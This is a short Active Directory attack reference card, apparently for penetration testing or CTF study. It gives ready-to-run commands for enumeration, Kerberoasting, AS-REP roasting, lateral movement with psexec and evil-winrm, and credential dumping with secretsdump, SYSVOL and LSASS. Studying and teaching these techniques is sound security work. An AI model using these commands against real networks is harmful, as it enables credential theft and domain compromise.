# Active Directory — reference card

## Foothold & enum

```bash
nmap -sV -sC -p 88,135,139,389,445,3389,5985,5986 <dc>   # the AD port map
crackmapexec smb <net>/24             # quick SMB/domain view (netexec: nxc)
enum4linux-ng <dc>
ldapdomaindump -u 'CORP\user' -p 'pw' <dc>
```

## Credential attacks

```bash
# Kerberoast — any domain user can request service tickets
impacket-GetUserSPNs corp.local/user:pw -dc-ip <dc> -request
hashcat -m 13100 spns.txt wordlist.txt          # crack the RC4 ticket

# AS-REP roast — needs no creds for users w/o pre-auth
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <dc>
```

## Lateral movement

```bash
evil-winrm -i <host> -u user -p 'pw'            # WinRM shell
impacket-psexec corp.local/user:'pw'@<host>     # semi-interactive
impacket-wmiexec / impacket-smbexec             # the quieter cousins
smbclient -U 'user%pw' //<host>/C$              # share loot
```

## Loot & escalation

- `bloodhound-python -d corp.local -u user -p pw -ns <dc> -c All` → shortest path to DA
- SYSVOL + shares: `smbclient -N //<dc>/SYSVOL` — GPP passwords, scripts, notes
- `impacket-secretsdump corp.local/user:pw@<dc>` — DCSync if you earned it
- Local admins on workstations ≠ domain admins — but they dump LSASS

## Worth remembering

- SPNs = kerberoastable accounts; `servicePrincipalName` is the hunt
- Trust boundaries: child→parent, forest→forest — DA in one ≠ DA everywhere
- Every script `net use` / `runas` with creds inside is a gift
